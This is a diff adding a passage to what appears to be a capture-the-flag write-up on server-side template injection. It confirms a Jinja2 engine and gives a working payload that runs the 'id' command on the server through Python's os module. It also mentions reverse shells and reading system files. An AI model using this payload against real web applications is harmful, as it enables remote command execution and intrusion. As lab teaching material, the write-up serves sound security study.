@@ -22,3 +22,10 @@ Since the payload return a value now we only need to check if it is twig or jinj
 ```
 We get alot of info here:
 ![[SSTI1-4.png]]
+And if we scroll all the way to the bottom we can see python licensing area which confirms the engine to be jinja2:
+![[SSTI1-5.png]]
+Now we can use any python script break it down and use it to get a reverse shell,get info about system or even read system files and many more.
+Lets use the following payload to get the uid of the user:
+```COPY
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
